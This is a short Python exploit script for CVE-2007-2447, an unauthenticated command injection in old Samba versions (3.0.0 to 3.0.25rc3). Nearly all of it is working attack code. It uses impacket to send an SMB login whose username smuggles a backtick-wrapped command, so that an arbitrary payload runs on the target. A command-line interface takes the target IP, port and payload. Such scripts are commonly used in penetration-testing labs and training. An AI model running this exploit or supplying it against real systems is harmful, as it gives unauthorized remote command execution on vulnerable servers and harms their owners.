# CVE-2007-2447
# Product: Samba
# Version: 3.0.0 - 3.0.25rc3
# Vulnerability: Unauthenticated Command Injection

from impacket import smbconnection
import argparse

def exploit(target_ip, port, payload):
    c = smbconnection.SMBConnection(target_ip, target_ip, sess_port=port)
    try:
        c.login(f"/=`nohup {payload}`", "", ntlmFallback=False)
    except:
        pass
    return True

def check(target_ip, port):
    try:
        smbconnection.SMBConnection(target_ip, target_ip, sess_port=port)
    except:
        return False
    return True

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("ip", type=str, help="IP address of the target")
    parser.add_argument("payload", type=str, help="Command to run on the target")
    parser.add_argument("--port", "-p", type=int, default=445, help="Port Samba is running on on the target (default 445)")
    args = parser.parse_args()
    target_ip: str = args.ip
    port: int = args.port
    payload: str = args.payload
    print("\x1b[38;5;214mWARNING: it is impossible to check whether the target is vulnerable, and there is no way of indicating whether the exploit succeeded. You will need to test for yourself whether this exploit was successful.")
    print("\x1b[0mChecking if target seems vulnerable...")
    if check(target_ip, port):
        print("Target may be vulnerable.")
        print("Attempting exploit...")
        success = exploit(target_ip, port, payload)
        if success:
            print("Exploit may have completed successfully")
        else:
            print("Exploit failed.")

